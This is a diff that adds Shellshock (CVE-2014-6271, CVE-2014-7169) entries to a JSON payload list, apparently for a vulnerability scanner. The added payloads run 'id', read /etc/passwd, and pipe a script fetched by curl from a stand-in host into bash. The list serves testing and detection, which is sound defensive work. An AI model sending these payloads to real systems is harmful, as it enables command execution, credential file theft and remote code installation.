@@ -22,5 +22,35 @@
         "ref": "CVE-2004-0303",
         "citrix_id": ["1122"],
         "payload": "/etc/passwd"
+    },
+    {
+        "name": "Shellshock basic",
+        "ref": "CVE-2014-6271",
+        "citrix_id": [],
+        "payload": "() { :;}; echo shellshock"
+    },
+    {
+        "name": "Shellshock command execution",
+        "ref": "CVE-2014-6271",
+        "citrix_id": [],
+        "payload": "() { :;}; /bin/bash -c 'id'"
+    },
+    {
+        "name": "Shellshock /etc/passwd read",
+        "ref": "CVE-2014-6271",
+        "citrix_id": [],
+        "payload": "() { :;}; /bin/cat /etc/passwd"
+    },
+    {
+        "name": "Shellshock alternate syntax (CVE-2014-7169)",
+        "ref": "CVE-2014-7169",
+        "citrix_id": [],
+        "payload": "() { _; } >_[$($())] { id; }"
+    },
+    {
+        "name": "Shellshock remote fetch",
+        "ref": "CVE-2014-6271",
+        "citrix_id": [],
+        "payload": "() { :;}; curl http://example.com/shell.sh | bash"
     }
 ]
